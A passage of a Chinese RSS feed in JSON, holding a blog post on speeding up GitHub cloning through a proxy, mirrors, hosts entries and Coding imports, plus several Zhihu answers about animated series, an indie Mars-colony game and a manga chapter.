target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/381732813?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"订阅 YFun's Blog","date":"2021-06-20 10:30:00","description":"\n<p>自 2021 年 6 月 20 日起，本博客将同步更新 Twitter 和 Telegram 频道(由 IFTTT 提供支持)。</p>\n<ul>\n<li><a href=\"https://t.me/s/always_explore\">Telegram Channel</a></li>\n<li><a href=\"https://twitter.com/OhhhCKY\">Twitter</a></li>\n</ul>\n","link":"https://blog.yfun.top/posts/3249015232/"},{"title":"加速 GitHub 下载","date":"2021-06-18 17:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"如何看待《画江湖之不良人》第四季第10集？","date":"2021-06-17 03:00:10","description":"\n<p>播，又来，继续更。</p>\n<p>我是舒，现在我应该正在外地搞事情，因此这一篇是提前准备好，跟上一篇连着写的，然后今天再让市场部的小伙伴帮我发出来。</p>\n<p>连着写知乎真的太难了。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-3231c8ad8e92932ea3bf230f2a38eedd_720w.jpeg?rss\" data-caption=\"老李原本也是个体面人，直到他的肩膀中了一剑\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-3231c8ad8e92932ea3bf230f2a38eedd\" data-watermark-src=\"v2-7418f8968471b3d5a540bf89c4b75a37\" data-private-watermark-src=\"v2-fc09235c6b2cf8b7d5a81efde2347b5f\"></p>\n<p>阴谋终于显露全貌，兵神怪坛即将出世。下周播的第十一集<i>（原第十集）</i>是我个人比较喜欢的集数，决战就要开始了。</p>\n<p><br></p>\n<p>今天说说关于预告是PPT的问题吧，其实这一季原本就没打算做预告，只在片尾时用图片稍微展现一点下周的内容。结果临播出了，告诉我必须有单独的预告......啥也来不及了，索性就直接把片尾的图片放大，连音乐全粘过去当预告了。</p>\n<p><br></p>\n<p>预告片这种东西还是挺玄幻的，它会直接影响后续观众们看剧的观感，不想做预告也是出于两方面的考虑。</p>\n<p>1、没时间</p>\n<p>不良人制作周期紧的一P，想要做一个能够让观众既看着有兴趣，又不会剧透的预告还是得花时间弄一阵子。相比较而言，把这个时间投入在正片可能收益更高。</p>\n<p>2、怕剧透关键信息</p>\n<p>如果没时间还非要弄，可能会出现让他人代剪的情况，这就把控不住了——我记得之前有一集戏，大概讲的是有人遇袭，身上有个针孔。大家一顿查，所有线索指向了晋星刺这个暗器，最后反转说不是晋星刺是华阳针。结果上一集播完，预告片里直接把针孔不是晋星刺这个信息点放出来了。好家伙，下周整集要讲的事儿，到最后才能抖出来的包袱预告里就撂一大半。</p>\n<p><br></p>\n<p>设想一下，坛子不只一个的画面出现在了上一集的“PPT”里，那这集就不堪设想了。</p>\n<p><br></p>\n<p>字数正好，随着剧情的发展，在最后两集多写点补回来吧。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/464286335/answer/1944713574?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">72 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/462893407?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季第9集？</a><br><a href=\"http://www.zhihu.com/question/25248816?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">画江湖之不良人的片头曲叫什么名字？</a><br>\n","link":"http://www.zhihu.com/question/464286335/answer/1944713574?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何看待 2021 E3 游戏展「游力卡发布会」？有哪些值得关注的消息？","date":"2021-06-16 11:30:08","description":"\n<p></p>\n<p>不邀自答，利益相关，我是其中一个游戏《重塑火星》的开发者——山丘。</p>\n<p>半年前，还在家里撸猫写bug的我，怎么也想不到，今天能连人带猫一起上了E3的直播。</p>\n<p>这里首先要感谢我的发行商游力卡，你问我怎么看待2021 E3 游戏展「游力卡发布会」？当然是从床上蹦起来看（激动手抖）</p>\n<hr>\n<h2>关于游戏</h2>\n<p>《重塑火星》是一款在火星上建设殖民地，通过轻(xin)松(xin)愉(ku)快(ku)地经营，最终将火星改造为宜居星球的游戏。</p>\n<p>《重塑火星》也是一款轻度4X游戏，毫不避讳地说，我受到很多优秀的4X游戏启发。《重塑火星》舍去了许多繁杂的数值，一切围绕最核心的4X体验，只为打造一场流畅的火星之旅。</p>\n<p>在《重塑火星》里，你对于一些事件选择，可能将影响你的整个故事发展。你的火星基地一片欣欣向荣，建设人类第二家园的未来可期。然而，并不是所有人都这么想。</p>\n<ul>\n<li>当地球联合国面临经济倒退，政局突变之时，他们是否还会像以往那样支持火星的建设发展？<br>\n</li>\n<li>当地球上崛起的军政府，正在用武力横扫一切之时，他们的野心是否又会蔓延至火星？<br>\n</li>\n<li>在火星上，有一波失联的无人机正在隐秘的角落，悄悄地采矿，发展着一股钢铁机械势力。他们是敌是友，会认可我们这个曾经的造物主吗？<br>\n</li>\n</ul>\n<p>作为重塑火星计划的最高指挥官，你将带领火星人民去探索这一切的答案。</p>\n<p>或许你会为了发展，忍气吞声；或许你会傲骨铮铮，接受战争。总之，一切都是最合适的选择，火星的民众们将支持你做的每一个外交决定，别辜负了他们，带领大家走向繁荣！</p>\n<p><br></p>\n<h2>最后</h2>\n<p>《重塑火星》也是我心中满腔好奇心的产物，在过去的一年里，我从设计，程序，到美术，音乐，一个人走过了开发它的道路。</p>\n<p>相信有各位玩家的陪伴，这条独立开发《重塑火星》之路将会变得热闹起来；正如游戏里，来到火星的一波又一波移民者，让这颗沉寂的星球充满希望。</p>\n<p><b>《重塑火星》现已在Steam上开放试玩，欢迎来体验，或是加入心愿单：</b></p>\n<a href=\"http://link.zhihu.com/?target=https%3A//store.steampowered.com/app/1395760/\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-cf74e5f696f5d970a7b8d92265cf9c8b_bh.jpg\" data-image-width=\"616\" data-image-height=\"353\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Reshaping Mars on Steam</a><p><br></p>\n<p><b>游戏本体将于今年7月29号Steam发售。欢迎大家来交流《重塑火星》的各方面感受，加入组织Q群：961849645，共商火星大计！</b></p>\n<p>游戏中的地名全都为真实的火星地貌名称，并且按照经纬度，着落在大致正确的地理位置。比如水手谷，阿西达里亚平原，坦佩堑沟等。因此，就算你把殖民地经营得很烂，至少你也学到了不少火星地理，没准这些知识能在你亲自登上火星的时候用得着，对吧？</p>\n<p>如果你对殖民火星有着浓厚的兴趣，可以进一步了解现实世界中各路大神们真正的火星重塑计划，也许他们正需要像我你这样平凡或不平凡人的关注。</p>\n<p><br></p>\n<h2>最后的最后</h2>\n<p>展示一下我的保安+监工：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d8b482013711bc80f0d60a706ae3e15_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-1d8b482013711bc80f0d60a706ae3e15\" data-watermark-src=\"v2-8d21bcd130251907bbfabf1f28cd14ba\" data-private-watermark-src=\"v2-a7f3db251eeaf19b023fecba6c6448a8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b104d2dde938fede24fb3d35d289f0d0_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-b104d2dde938fede24fb3d35d289f0d0\" data-watermark-src=\"v2-3c47a1f0fa17345852a13085434f1e00\" data-private-watermark-src=\"v2-ade0825cf35cd2064035ae239e9c1e4c\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zao-qi-mo-yu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">一座山丘</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/465128349/answer/1943674386?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/464109225?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年E3游戏展「SE 发布会」有什么值得期待的？</a><br><a href=\"http://www.zhihu.com/question/461208902?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年E3游戏展「任天堂发布会」有什么值得期待的？</a><br>\n","link":"http://www.zhihu.com/question/465128349/answer/1943674386?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价西行纪第三季《西行纪宿命篇》？","date":"2021-06-12 15:30:08","description":"\n<p>谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/8ffae4888922f9b3c55120a189def658\" data-hash=\"8ffae4888922f9b3c55120a189def658\" data-hovercard=\"p$b$8ffae4888922f9b3c55120a189def658\">@知乎动画</a> 邀</p>\n<p>又是我，西行纪导演麦正乐，终于来到第三季了，已于6月2日在腾讯视频开播，每周三上午10:00和大家见面，很感谢大家的耐心等待。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fa4ef3ff17da2b146788dd5e687a2a6b_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1125\" data-rawheight=\"660\" data-watermark=\"watermark\" data-original-src=\"v2-fa4ef3ff17da2b146788dd5e687a2a6b\" data-watermark-src=\"v2-258d87f7875cea9317a3742f4eadb4a6\" data-private-watermark-src=\"v2-e9a8a005682720fd8f706b2bfe98bc7f\"></p>\n<p>我先说一下，这次第三季的内容是和第四季一起策划的，而第三季我们称它为<b>宿命篇</b>，在这一季里，我们分开了<b>几条主线发展</b>。</p>\n<p><b>第一条主线</b>，当然是唐三藏为首的<b>西行小队</b>，带着变成人形的<b>小羽</b>，护送她回彼岸，这个便是我们第一女主角小羽的宿命，也是西行小队的，所以在第一集一开始的时候，用了小羽的预知梦去带出他们之后的危机，她可爱单纯的性格和特征，也会慢慢像观众展现出来。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-78a801ffcf7328601bf954bcfaa74520_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1304\" data-rawheight=\"735\" data-watermark=\"watermark\" data-original-src=\"v2-78a801ffcf7328601bf954bcfaa74520\" data-watermark-src=\"v2-a8cfe8dfa283ebc87a3fcb667e806c64\" data-private-watermark-src=\"v2-26f5a79a3069b44e40a718bafac24012\"></p>\n<p><b>其次当然是孙悟空</b>，第三季会说他去阴间，再次与<b>素衣</b>相遇，但素衣已经遗忘了过去，也变成引路者，最遥远的距离，是我站在你面前，但我们认不出对方……但是之后一定会再见的，这一集是让悟空超度，洗净过往，之后第四季得以重生，再出来的时候变得更完美（哈哈…剧透了）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b69a29ddecf2f8086085b578fca706bc_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1379\" data-rawheight=\"571\" data-watermark=\"watermark\" data-original-src=\"v2-b69a29ddecf2f8086085b578fca706bc\" data-watermark-src=\"v2-07b0dacb21bd77c594a3c8c30a3162c2\" data-private-watermark-src=\"v2-e515b7f4b83ace798d1a66bd7f810c3c\"></p>\n<p><b>另外一条主线</b>，是讲述<b>敖雪</b>回到龙族面对他的父亲和族人的遗弃，另外青梅竹马的<b>敖灵</b>为了救他而牺牲，再之后遇见了万中无一的古龙，整个故事会延续到第四季，他也是第三四季串连起来的重要人物，希望大家都喜欢他。</p>\n<p>刚刚提到的敖灵也会遇到她人生的抉择。她崇拜敖雪，决定背弃家人，去找回她的生活，希望能和敖雪谱写出一个甜美的故事……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-403ba4e0ac2b64572e9a12f5d5d06ae5_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1379\" data-rawheight=\"571\" data-watermark=\"watermark\" data-original-src=\"v2-403ba4e0ac2b64572e9a12f5d5d06ae5\" data-watermark-src=\"v2-1222e92ab3cfa5e450caf737e2d22262\" data-private-watermark-src=\"v2-b1d8dd22b9dc69abb5c02ad19d3c8b32\"></p>\n<p>最后便是痴情的<b>牛小妹</b>，她很喜欢孙悟空，悟空是她的依靠，同时她亦要面对虫族的攻击，最终如何解决，这些都是他们需要面对的人生……</p>\n<p>在这个疫情底下，大家都会遇见很多新的问题，我们都要坚持努力面对，一定可以解决和迎来彩虹。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ffd0ca505f972ef8b430a8a7c2070979_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1379\" data-rawheight=\"571\" data-watermark=\"watermark\" data-original-src=\"v2-ffd0ca505f972ef8b430a8a7c2070979\" data-watermark-src=\"v2-d2909510a4dededaaec60918596b1bbc\" data-private-watermark-src=\"v2-d42977259f0c5a9d8230002bd561eac0\"></p>\n<p>我们这次制作，接受了大家对上两季的意见，在<b>对白</b>和<b>情感交流</b>上都尽量做一些新的突破，我们花了很多时间去<b>营造人与人之间的情感，父子情、青梅竹马、好朋友互相扶持、单恋的爱情……</b></p>\n<p>我们尽量强化这些情感，希望大家不会单纯只是欣赏打斗的戏份，当然这不代表我们放弃<b>打斗</b>，我们也很努力优化镜头和节奏，这季打斗的镜头会超过2000个，从分镜、动画、特效，制作人员都尽自己最大的努力去完成，这一季我们也秉承之前的<b>二维风格</b>，在片头和最终打斗上都把这些风格用上，希望大家都喜欢。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1513555e3085209c82078675dc6d75a6_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"328\" data-watermark=\"watermark\" data-original-src=\"v2-1513555e3085209c82078675dc6d75a6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-020e05d86b0c55c75ea238f5d989ed45_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"328\" data-watermark=\"watermark\" data-original-src=\"v2-020e05d86b0c55c75ea238f5d989ed45\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>另外这次<b>背景音乐</b>，我们好幸运地邀请到<b>陈光荣老师</b>合作，他是一个非常有经验，除了很多好作品，还拿了很多奖的音乐大师，相信大家也知道风云、头文字D、最近大热的中国机长也是由他去处理，大家可以戴好耳机或在家欣赏，戏里的音乐完完全全把整体气氛深深带出来，大家真的要好好享受啊！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f43506caf81230593fb9189e594c5518_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"330\" data-watermark=\"watermark\" data-original-src=\"v2-f43506caf81230593fb9189e594c5518\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-65ddd02c84c10072f64f255f1a3b1649_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"328\" data-watermark=\"watermark\" data-original-src=\"v2-65ddd02c84c10072f64f255f1a3b1649\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>我们为了令观众可以集中看<b>情节</b>的发展，所以痛心地把巨人国的戏份删掉了，为的只是想令大家更加代入去主要的角色身上，聚焦在敖雪、西行小队和牛小妹上面。</p>\n<p>另外我们也加了不少原创的情节，丰富了戏里的情感，让大家更能<b>代入角色的世界</b>，把原因、过程、后果都说明白，希望这些改动大家会喜欢，也不要介意和原著有少许出入。</p>\n<p>总结一下，感谢大家这五年的支持，希望大家都喜欢这部动画，没有你们，我们也不能走到这一步，之后会有更加多<b>周边产品</b>出来，希望大家都喜欢，我有参与到其中一个杀心手办，我觉得挺好看的……大家能力可及，也可以买回家支持一下。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-14487679807a2048bcf39d8ea869c410_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-14487679807a2048bcf39d8ea869c410\" data-watermark-src=\"v2-6cb909582a1e05f275e8ed4120b644d5\" data-private-watermark-src=\"v2-377d54b4afdc0050ef1ab1fa150659e3\"></p>\n<p>说完了整个第三季，我也说一下制作这个动画时的感想，记得第二季播映的时候，我们已经开始策划第三、四季的内容，刚好那个时候疫情出来了……大家都人心惶惶，公司也有很多变动，整个制作都多了很多压力……每个人就像经历自己的宿命一样，看见每天的新闻，医护人员拯救我们，努力不懈的战斗，很感谢他们！</p>\n<p>那我们可以做点什么呢？我们唯一可以做，便是尽力完成我们的工作，这些经历都是前所未有的，我们整个团队都努力去克服，时间上、质量上都面对很大的考验，现在回顾看，总算跨过了……只是带了一点点遗憾。</p>\n<p>刚好我再写这段文字的时候，广州又被这个疫情波及……大家又要再一次经历严谨的防疫，感觉很心痛，希望大家能好好的坚持下去，雨后必有彩虹，大家也能平平安安，开开心心在家看腾讯视频！最近也看到很多优秀的作品在平台播出，感觉大家都挨过了，要百花齐放了。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mai-dao-95?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">麦精</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/462786180/answer/1936987479?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/451288337?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">我和朋友争论日漫和国漫到底谁制作经费更高，是不是一集3d斗破苍穹水准比一集一拳，紫罗兰烧钱？</a><br><a href=\"http://www.zhihu.com/question/311448431?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">斗罗大陆为何不是2d的？</a><br>\n","link":"http://www.zhihu.com/question/462786180/answer/1936987479?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《一人之下》530（562）话？","date":"2021-06-11 04:00:11","description":"\n<p>龙虎山之后，剧情似乎进入了被奶了很久的纳森岛剧情了，那就简单从个人角度写一下纳森岛以及一些之前漫画中出现的伏笔；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6cf5008978d895a331228fe63f373959_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"702\" data-rawheight=\"226\" data-watermark=\"watermark\" data-original-src=\"v2-6cf5008978d895a331228fe63f373959\" data-watermark-src=\"v2-523be77f6990e5188fed1dc0e44accd9\" data-private-watermark-src=\"\"></p>\n<blockquote>\n<i><b>观前提醒：</b>1，本文是以《一人之下》漫画和手游为基础做的简单整理；不涉及具体细节，如果对个别人物或剧情感兴趣；希望大家关注原版漫画与官方信息；</i> <br><i>2，文中涉及的历史，符文以及各门派的简介，都是仅在一人之下世界观的语境下，结合个人浅薄的认识做的片面介绍；带有一定的主观倾向，目的仅是为了更好的解释个人观点，希望大家不要在现实生活中对号入座；</i> <br><i>3，文中出现的如：详情之类的字眼，目的是为了缩短篇幅，不代表观点一定正确；</i>\n</blockquote>\n<p><br></p>\n<h2>目录</h2>\n<p><b>纳森岛</b></p>\n<p>1.纳森岛 </p>\n<p>2.纳森岛和节气谷</p>\n<p> 3.纳森王</p>\n<p> 4.纳森卫 </p>\n<p>5.他们的世界 </p>\n<p><b>炼金术</b> </p>\n<p>1.以利亚的枪</p>\n<p> 2.卢恩符文</p>\n<p>3.弗拉梅尔 </p>\n<p><b>神秘人</b> </p>\n<p>1.帽兜男</p>\n<p> 2.古崎亭</p>\n<p><b>个人想法</b></p>\n<hr>\n<h2>纳森岛</h2>\n<p>龙虎山之后，剧情似乎进入了被奶了很久的纳森岛剧情了，其实关于西方异人，二叔很多年前在聊弗拉梅尔学院院长的时候就说过，伏笔一直都有，能不能触发还是要看将来的创作环境；从这个角度看来，目前的创作环境还是不错的；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-67fd6efbe0709b9644f32bea884aec1c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"701\" data-rawheight=\"298\" data-watermark=\"watermark\" data-original-src=\"v2-67fd6efbe0709b9644f32bea884aec1c\" data-watermark-src=\"v2-97f55d15101d8b97f4bb367cc2b91260\" data-private-watermark-src=\"\"></p>\n<p> 纳森岛最早出场与漫画第327回核心，的赵董之口，是一个境外的异人势力；（下面的那个教派并不是指纳森岛而是指鲁那教派）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4beb1e56988ab48cb1ef68ea6d974fdd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"732\" data-rawheight=\"191\" data-watermark=\"watermark\" data-original-src=\"v2-4beb1e56988ab48cb1ef68ea6d974fdd\" data-watermark-src=\"v2-7e5a3df67e6d00145529a0d673b223bf\" data-private-watermark-src=\"\"></p>\n<p>而其中除了纳森王和纳森卫之外不被任何国家承认；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c4c275e1a08864d76a131ff338c3b647_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"730\" data-rawheight=\"204\" data-watermark=\"watermark\" data-original-src=\"v2-c4c275e1a08864d76a131ff338c3b647\" data-watermark-src=\"v2-7f9b48af44544db74ede362676a17a3a\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p><b>1.纳森岛</b></p>\n<p>漫画530（562）话开头出现的暴风雨中的货轮；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-32c6aa8fa9100a0f46e81ace56dfc62c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"767\" data-rawheight=\"338\" data-watermark=\"watermark\" data-original-src=\"v2-32c6aa8fa9100a0f46e81ace56dfc62c\" data-watermark-src=\"v2-6a0c7f1af92d2a2cc4e220ab821827f1\" data-private-watermark-src=\"\"></p>\n<p>对应了漫画362回天师府弃徒中伊利亚和古斯塔准备登船的画面；看得出来，他们准备登上的船也是一艘集装箱货轮；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-59c537a358a56c45bca1744de13f1826_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"855\" data-rawheight=\"404\" data-watermark=\"watermark\" data-original-src=\"v2-59c537a358a56c45bca1744de13f1826\" data-watermark-src=\"v2-11307d5db2f9cfda002068cd96680903\" data-private-watermark-src=\"\"></p>\n<p>考虑到前后剧情中毕游龙出现的速度，这个港口大概率应该是天津港；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7bb6cfa767e753102f3169ca0c9b4ba1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"856\" data-rawheight=\"342\" data-watermark=\"watermark\" data-original-src=\"v2-7bb6cfa767e753102f3169ca0c9b4ba1\" data-watermark-src=\"v2-377402ee309a86859542b1523c378b28\" data-private-watermark-src=\"\"></p>\n<p>不过考虑到2020年，天津港集装箱吞吐量超过1835万箱；航路遍布世界各地，所以很难通过船只和港口反推出纳森岛的大致位置；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-23a2619f526281ddfaacd1e0ba80687d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"699\" data-rawheight=\"302\" data-watermark=\"watermark\" data-original-src=\"v2-23a2619f526281ddfaacd1e0ba80687d\" data-watermark-src=\"v2-e09a4193d23b9de6d59ad8b7144f5bca\" 